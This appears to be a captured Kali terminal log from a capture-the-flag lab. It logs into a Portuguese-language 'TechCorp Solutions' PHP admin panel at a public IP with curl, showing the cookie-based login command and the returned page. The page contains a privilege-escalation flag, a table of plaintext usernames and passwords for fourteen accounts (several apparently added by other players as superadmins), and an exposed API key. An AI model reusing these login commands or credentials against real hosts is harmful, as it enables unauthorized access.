@@ -1,0 +1,238 @@
+┌──(root㉿kali)-[~]
+└─# curl -sS -c cookies.txt -d "username=superadmin" -d "password=Sup3r@dm1n\!2024#Secure" http://98.95.207.28/login.php                                                                                                                    
+
+┌──(root㉿kali)-[~]
+└─# curl -sS -b cookies.txt "http://98.95.207.28/admin.php"                                                                                                                                                                                 
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - TechCorp Solutions</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <h1>TechCorp Solutions - Admin Panel</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="dashboard.php">Dashboard</a></li>
+                    <li><a href="admin.php">Admin</a></li>
+                    <li><a href="logout.php">Sair</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <h2>Painel Administrativo</h2>
+            <p>Nível de acesso: <strong>superadmin</strong></p>
+
+                            <!-- Superadmin tem acesso total e vê a FLAG -->
+                <div class="alert alert-success" style="background: #e8f5e9; border-left: 4px solid #4caf50;">
+                    <h3 style="color: #2e7d32;">✅ Acesso Total - Superadmin</h3>
+                    <p style="color: #2e7d32;">
+                        Você tem privilégios máximos no sistema!
+                    </p>
+                </div>
+
+                <!-- FLAG 9: Privilege Escalation Success -->
+                <div style="padding: 2rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border-radius: 8px; margin: 2rem 0; box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
+                    <h3 style="margin: 0 0 1rem 0; font-size: 1.5rem;">🎯 FLAG 9 - Privilege Escalation</h3>
+                    <p style="margin: 0 0 1rem 0; opacity: 0.9;">
+                        Parabéns! Você conseguiu escalar privilégios de <strong>admin</strong> para <strong>superadmin</strong>!
+                    </p>
+                    <div style="padding: 1.5rem; background: rgba(0,0,0,0.2); border-radius: 6px; font-family: 'Courier New', monospace; font-size: 1.2rem; text-align: center; letter-spacing: 2px; font-weight: bold;">
+                        FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}                    </div>
+                </div>
+
+                <h3>Painel de Controle Total</h3>
+                <div class="features">
+                    <div class="feature-box">
+                        <h3>👥 Gerenciar Usuários</h3>
+                        <p>Total: 14 usuários</p>
+                        <button class="btn">Gerenciar</button>
+                    </div>
+                    <div class="feature-box">
+                        <h3>🔐 Logs de Segurança</h3>
+                        <p>Monitorar acessos</p>
+                        <button class="btn">Ver Logs</button>
+                    </div>
+                    <div class="feature-box">
+                        <h3>🗄️ Backups</h3>
+                        <p>Sistema completo</p>
+                        <button class="btn">Configurar</button>
+                    </div>
+                </div>
+
+                <h3>Todos os Usuários (Acesso Superadmin)</h3>
+                <table>
+                    <tr>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Role</th>
+                        <th>Criado em</th>
+                    </tr>
+                                        <tr>
+                        <td>1</td>
+                        <td>admin</td>
+                        <td><code>admin123</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #2196f3; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                admin                            </span>
+                        </td>
+                        <td>2025-11-17 14:30:36</td>
+                    </tr>
+                                        <tr>
+                        <td>2</td>
+                        <td>user</td>
+                        <td><code>password123</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #9e9e9e; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                user                            </span>
+                        </td>
+                        <td>2025-11-17 14:30:36</td>
+                    </tr>
+                                        <tr>
+                        <td>3</td>
+                        <td>manager</td>
+                        <td><code>manager2024</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #9e9e9e; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                manager                            </span>
+                        </td>
+                        <td>2025-11-17 14:30:36</td>
+                    </tr>
+                                        <tr>
+                        <td>4</td>
+                        <td>guest</td>
+                        <td><code>guest</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #9e9e9e; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                guest                            </span>
+                        </td>
+                        <td>2025-11-17 14:30:36</td>
+                    </tr>
+                                        <tr>
+                        <td>5</td>
+                        <td>superadmin</td>
+                        <td><code>Sup3r@dm1n!2024#Secure</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-17 19:38:25</td>
+                    </tr>
+                                        <tr>
+                        <td>6</td>
+                        <td>gilson</td>
+                        <td><code>g1ls0n123</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #9e9e9e; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                user                            </span>
+                        </td>
+                        <td>2025-11-17 22:52:03</td>
+                    </tr>
+                                        <tr>
+                        <td>7</td>
+                        <td>cl4ud1o</td>
+                        <td><code>https://fakeupdate.net/wnc/</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-17 22:55:10</td>
+                    </tr>
+                                        <tr>
+                        <td>8</td>
+                        <td>al1nn3</td>
+                        <td><code>estiveaqui,yes</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-18 14:17:09</td>
+                    </tr>
+                                        <tr>
+                        <td>9</td>
+                        <td>erick</td>
+                        <td><code>bomdiagrupodozap</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-19 10:16:03</td>
+                    </tr>
+                                        <tr>
+                        <td>10</td>
+                        <td>Yur1</td>
+                        <td><code>gilsonmedeucola</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-19 23:50:55</td>
+                    </tr>
+                                        <tr>
+                        <td>11</td>
+                        <td>K4r01</td>
+                        <td><code>~ngmmeviu</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-19 23:54:12</td>
+                    </tr>
+                                        <tr>
+                        <td>12</td>
+                        <td>4dr13l</td>
+                        <td><code>gr33np00s1on</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-19 13:15:12</td>
+                    </tr>
+                                        <tr>
+                        <td>13</td>
+                        <td>SAUDADES VAI NA WEB</td>
+                        <td><code>2025CYBERSEC</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-19 13:15:12</td>
+                    </tr>
+                                        <tr>
+                        <td>14</td>
+                        <td>f3l1p3_m4sc3n4</td>
+                        <td><code>demoreimaschegueixD</code></td>
+                        <td>
+                            <span style="padding: 0.25rem 0.5rem; background: #4caf50; color: white; border-radius: 3px; font-size: 0.85rem;">
+                                superadmin                            </span>
+                        </td>
+                        <td>2025-11-21 04:23:46</td>
+                    </tr>
+                                    </table>
+
+                <div style="margin-top: 2rem;">
+                    <h3>Configurações Avançadas</h3>
+                    <p><strong>Database:</strong> techcorp_db</p>
+                    <p><strong>Version:</strong> 2.3.1</p>
+                    <p><strong>API Key:</strong> <code>tc_sk_prod_9Kx7mN2pQ4rT8wY</code></p>
+                </div>
+                    </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 TechCorp Solutions. Todos os direitos reservados.</p>
+        </div>
+    </footer>
+</body>
+</html>
